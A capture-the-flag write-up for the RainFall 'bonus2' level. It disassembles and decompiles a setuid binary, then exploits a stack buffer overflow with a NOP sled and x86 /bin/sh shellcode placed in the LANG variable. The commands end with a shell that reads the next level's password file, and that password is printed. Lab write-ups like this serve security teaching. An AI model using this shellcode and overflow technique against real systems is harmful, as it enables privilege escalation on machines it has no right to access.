What do we have?

	$ ll
	total 17
	dr-xr-x---+ 1 bonus2 bonus2   80 Mar  6  2016 ./
	dr-x--x--x  1 root   root    340 Sep 23  2015 ../
	-rw-r--r--  1 bonus2 bonus2  220 Apr  3  2012 .bash_logout
	-rw-r--r--  1 bonus2 bonus2 3530 Sep 23  2015 .bashrc
	-rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2*
	-rw-r--r--+ 1 bonus2 bonus2   65 Sep 23  2015 .pass
	-rw-r--r--  1 bonus2 bonus2  675 Apr  3  2012 .profile

A `bonus2` binary.

	$ gdb ./bonus2
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x08048529 <+0>:	push   %ebp
	0x0804852a <+1>:	mov    %esp,%ebp
	0x0804852c <+3>:	push   %edi
	0x0804852d <+4>:	push   %esi
	0x0804852e <+5>:	push   %ebx
	=> 0x0804852f <+6>:	and    $0xfffffff0,%esp
	0x08048532 <+9>:	sub    $0xa0,%esp
	0x08048538 <+15>:	cmpl   $0x3,0x8(%ebp)
	0x0804853c <+19>:	je     0x8048548 <main+31>
	0x0804853e <+21>:	mov    $0x1,%eax
	0x08048543 <+26>:	jmp    0x8048630 <main+263>
	0x08048548 <+31>:	lea    0x50(%esp),%ebx
	0x0804854c <+35>:	mov    $0x0,%eax
	0x08048551 <+40>:	mov    $0x13,%edx
	0x08048556 <+45>:	mov    %ebx,%edi
	0x08048558 <+47>:	mov    %edx,%ecx
	0x0804855a <+49>:	rep stos %eax,%es:(%edi)
	0x0804855c <+51>:	mov    0xc(%ebp),%eax
	0x0804855f <+54>:	add    $0x4,%eax
	0x08048562 <+57>:	mov    (%eax),%eax
	0x08048564 <+59>:	movl   $0x28,0x8(%esp)
	0x0804856c <+67>:	mov    %eax,0x4(%esp)
	0x08048570 <+71>:	lea    0x50(%esp),%eax
	0x08048574 <+75>:	mov    %eax,(%esp)
	0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>
	0x0804857c <+83>:	mov    0xc(%ebp),%eax
	0x0804857f <+86>:	add    $0x8,%eax
	0x08048582 <+89>:	mov    (%eax),%eax
	0x08048584 <+91>:	movl   $0x20,0x8(%esp)
	0x0804858c <+99>:	mov    %eax,0x4(%esp)
	0x08048590 <+103>:	lea    0x50(%esp),%eax
	0x08048594 <+107>:	add    $0x28,%eax
	0x08048597 <+110>:	mov    %eax,(%esp)
	0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
	0x0804859f <+118>:	movl   $0x8048738,(%esp)
	0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
	0x080485ab <+130>:	mov    %eax,0x9c(%esp)
	0x080485b2 <+137>:	cmpl   $0x0,0x9c(%esp)
	0x080485ba <+145>:	je     0x8048618 <main+239>
	0x080485bc <+147>:	movl   $0x2,0x8(%esp)
	0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)
	0x080485cc <+163>:	mov    0x9c(%esp),%eax
	0x080485d3 <+170>:	mov    %eax,(%esp)
	0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>
	0x080485db <+178>:	test   %eax,%eax
	0x080485dd <+180>:	jne    0x80485eb <main+194>
	0x080485df <+182>:	movl   $0x1,0x8049988
	0x080485e9 <+192>:	jmp    0x8048618 <main+239>
	0x080485eb <+194>:	movl   $0x2,0x8(%esp)
	0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)
	0x080485fb <+210>:	mov    0x9c(%esp),%eax
	0x08048602 <+217>:	mov    %eax,(%esp)
	0x08048605 <+220>:	call   0x8048360 <memcmp@plt>
	0x0804860a <+225>:	test   %eax,%eax
	0x0804860c <+227>:	jne    0x8048618 <main+239>
	0x0804860e <+229>:	movl   $0x2,0x8049988
	0x08048618 <+239>:	mov    %esp,%edx
	0x0804861a <+241>:	lea    0x50(%esp),%ebx
	0x0804861e <+245>:	mov    $0x13,%eax
	0x08048623 <+250>:	mov    %edx,%edi
	0x08048625 <+252>:	mov    %ebx,%esi
	0x08048627 <+254>:	mov    %eax,%ecx
	0x08048629 <+256>:	rep movsl %ds:(%esi),%es:(%edi)
	0x0804862b <+258>:	call   0x8048484 <greetuser>
	0x08048630 <+263>:	lea    -0xc(%ebp),%esp
	0x08048633 <+266>:	pop    %ebx
	0x08048634 <+267>:	pop    %esi
	0x08048635 <+268>:	pop    %edi
	0x08048636 <+269>:	pop    %ebp
	0x08048637 <+270>:	ret    
	End of assembler dump.

	(gdb) info functions
	All defined functions:

	Non-debugging symbols:
	[...]
	0x08048484  greetuser
	0x08048529  main

	(gdb) disas greetuser
	Dump of assembler code for function greetuser:
	0x08048484 <+0>:	push   %ebp
	0x08048485 <+1>:	mov    %esp,%ebp
	0x08048487 <+3>:	sub    $0x58,%esp
	0x0804848a <+6>:	mov    0x8049988,%eax
	0x0804848f <+11>:	cmp    $0x1,%eax
	0x08048492 <+14>:	je     0x80484ba <greetuser+54>
	0x08048494 <+16>:	cmp    $0x2,%eax
	0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
	0x08048499 <+21>:	test   %eax,%eax
	0x0804849b <+23>:	jne    0x804850a <greetuser+134>
	0x0804849d <+25>:	mov    $0x8048710,%edx
	0x080484a2 <+30>:	lea    -0x48(%ebp),%eax
	0x080484a5 <+33>:	mov    (%edx),%ecx
	0x080484a7 <+35>:	mov    %ecx,(%eax)
	0x080484a9 <+37>:	movzwl 0x4(%edx),%ecx
	0x080484ad <+41>:	mov    %cx,0x4(%eax)
	0x080484b1 <+45>:	movzbl 0x6(%edx),%edx
	0x080484b5 <+49>:	mov    %dl,0x6(%eax)
	0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>
	0x080484ba <+54>:	mov    $0x8048717,%edx
	0x080484bf <+59>:	lea    -0x48(%ebp),%eax
	0x080484c2 <+62>:	mov    (%edx),%ecx
	0x080484c4 <+64>:	mov    %ecx,(%eax)
	0x080484c6 <+66>:	mov    0x4(%edx),%ecx
	0x080484c9 <+69>:	mov    %ecx,0x4(%eax)
	0x080484cc <+72>:	mov    0x8(%edx),%ecx
	0x080484cf <+75>:	mov    %ecx,0x8(%eax)
	0x080484d2 <+78>:	mov    0xc(%edx),%ecx
	0x080484d5 <+81>:	mov    %ecx,0xc(%eax)
	0x080484d8 <+84>:	movzwl 0x10(%edx),%ecx
	0x080484dc <+88>:	mov    %cx,0x10(%eax)
	0x080484e0 <+92>:	movzbl 0x12(%edx),%edx
	0x080484e4 <+96>:	mov    %dl,0x12(%eax)
	0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>
	0x080484e9 <+101>:	mov    $0x804872a,%edx
	0x080484ee <+106>:	lea    -0x48(%ebp),%eax
	0x080484f1 <+109>:	mov    (%edx),%ecx
	0x080484f3 <+111>:	mov    %ecx,(%eax)
	0x080484f5 <+113>:	mov    0x4(%edx),%ecx
	0x080484f8 <+116>:	mov    %ecx,0x4(%eax)
	0x080484fb <+119>:	mov    0x8(%edx),%ecx
	0x080484fe <+122>:	mov    %ecx,0x8(%eax)
	0x08048501 <+125>:	movzwl 0xc(%edx),%edx
	0x08048505 <+129>:	mov    %dx,0xc(%eax)
	0x08048509 <+133>:	nop
	0x0804850a <+134>:	lea    0x8(%ebp),%eax
	0x0804850d <+137>:	mov    %eax,0x4(%esp)
	0x08048511 <+141>:	lea    -0x48(%ebp),%eax
	0x08048514 <+144>:	mov    %eax,(%esp)
	0x08048517 <+147>:	call   0x8048370 <strcat@plt>
	0x0804851c <+152>:	lea    -0x48(%ebp),%eax
	0x0804851f <+155>:	mov    %eax,(%esp)
	0x08048522 <+158>:	call   0x8048390 <puts@plt>
	0x08048527 <+163>:	leave  
	0x08048528 <+164>:	ret    
	End of assembler dump.

`Ghidra` and polish it:

	int		language = 0;
	char	*DAT_0804873d = "fi";
	char	*DAT_08048740 = "nl";

	int main(int argc, char **argv)
	{
		int		uVar1;
		int		iVar2;
		char	*pcVar3;
		int		*puVar4;
		char	bVar5;
		char	local_60[40];
		char	acStack_38[36];
		char	stack0xffffff50[76];
		char	*local_14;
		
		bVar5 = 0;
		if (argc == 3)
		{
			[...]
		}
		else
			uVar1 = 1;
		return (uVar1);
	}

Check if `argc` is at 3, else quit.

			pcVar3 = local_60;
			for (iVar2 = 19; iVar2 != 0; iVar2--)
			{
				pcVar3[0] = '\0';
				pcVar3[1] = '\0';
				pcVar3[2] = '\0';
				pcVar3[3] = '\0';
				pcVar3 = pcVar3 + 4;
			}
			strncpy(local_60, argv[1], 40);
			strncpy(acStack_38, argv[2], 32);

Inside of the if, put all bytes of a buffer (40 bytes) to 0, and then copy max 40 bytes of `argv[1]` into it. Copy max 32 bytes of `argv[2]` into a second buffer (32 bytes).
		
			local_14 = getenv("LANG");
			if (local_14 != NULL)
			{
				iVar2 = memcmp(local_14, DAT_0804873d, 2);
				if (iVar2 == 0)
					language = 1;
				else
				{
					iVar2 = memcmp(local_14, DAT_08048740, 2);
					if (iVar2 == 0)
						language = 2;
				}
			}

Get the `LANG` env variable, and `memcmp` it with two strings, setting the global variable `language` to a certain value.

			pcVar3 = local_60;
			puVar4 = (int *)((char *)local_60 - 76);
			for (iVar2 = 19; iVar2 != 0; iVar2--)
			{
				*puVar4 = *(int *)pcVar3;
				pcVar3 = pcVar3 + 4;
				puVar4++;
			}
			uVar1 = greetuser();

Copy 76 bytes from the first buffer (and thus both the first and second buffer) into a third one of 76 bytes, right after the two. Then, calls `greetuser`.

	int	greetuser(void)
	{
		char	local_4c[4];
		union
		{
			int				i;
			unsigned char	b[4];
		}		local_48;
		char	local_44[64];

		if (language == 1)
		{
			strncpy(local_4c, "Hyvú", 4);
			local_48.b[0] = -92;
			local_48.b[1] = -61;
			local_48.b[2] = -92;
			local_48.b[3] = ' ';
			strncpy(local_44, "päivää ", 11);
		}
		else if (language == 2)
		{
			strncpy(local_4c, "Goed", 4);
			local_48.b[0] = 'e';
			local_48.b[1] = 'm';
			local_48.b[2] = 'i';
			local_48.b[3] = 'd';
			strncpy(local_44, "dag!", 4);
			local_44[4] = ' ';
			local_44[5] = '\0';
		}
		else if (language == 0)
		{
			strncpy(local_4c, "Hell", 4);
			local_48.b[0] = 111;
			local_48.b[1] = 32;
			local_48.b[2] = 0;
		}
		strcat(local_4c, (char *)((char *)&local_4c + 4));
		return (puts(local_4c));
	}

Depending on the `LANG` env variable, fill the first buffer with certains 4 chars, put certains values in the union, and `strcat` the buffer with the union.

So, first, we'll put the `LANG` env variable to `fi` to avoid the null byte added by the other two options. Then, let's search for `eip` with a pattern.


	$ gdb --args ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4A h5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) n
	Single stepping until exit from function main,
	which has no line number information.
	Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5

	Program received signal SIGSEGV, Segmentation fault.
	0x69413169 in ?? ()
	
The pattern generator says the offset is of 244. There is 226 bytes in the first argument, so it's 18 bytes in of the second.

	bonus2@RainFall:~$ gdb --args ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4A AAAABBBBCCCCDDDDEEZZZZ
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) n
	Single stepping until exit from function main,
	which has no line number information.
	Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAAAABBBBCCCCDDDDEEZZZZ

	Program received signal SIGSEGV, Segmentation fault.
	0x5a5a5a5a in ?? ()

Next, we'll put the shellcode into the env variable, and search its address.

	$ export LANG=$'fi\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

	$ gdb --args ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4A AAAABBBBCCCCDDDDEEZZZZ
	[...]
	(gdb) b *0x080485ab
	[...]
	(gdb) r
	Starting program: /home/user/bonus2/bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4A AAAABBBBCCCCDDDDEEZZZZ

	Breakpoint 1, 0x080485ab in main ()
	(gdb) i r
	eax            0xbffffef8	-1073742088

`0xbffffef8` + 4 = `0xbffffefc` => `\xfc\xfe\xff\xbf`

	$ gdb --args ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4A $'AAAABBBBCCCCDDDDEE\xfc\xfe\xff\xbf'
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) n
	Single stepping until exit from function main,
	which has no line number information.
	Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAAAABBBBCCCCDDDDEE����
	process 3694 is executing new program: /bin/dash
	Error in re-setting breakpoint 1: Function "main" not defined.
	$ whoami
	bonus2
	$

This solution works under gdb, but not without!

	$ ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4A $'AAAABBBBCCCCDDDDEE\xfc\xfe\xff\xbf'
	Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAAAABBBBCCCCDDDDEE����
	Segmentation fault (core dumped)

Most probably a difference of addresses in the env because of gdb, so we'll profit of our lengthy NOP sled, and give `0xbfffff16` (0xbffffef8 + 30).

	$ bonus2@RainFall:~$ ./bonus2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4A $'AAAABBBBCCCCDDDDEE\x16\xff\xff\xbf'
	Hyvää päivää Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2AAAAABBBBCCCCDDDDEE���
	$ cat /home/user/bonus3/.pass
	71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
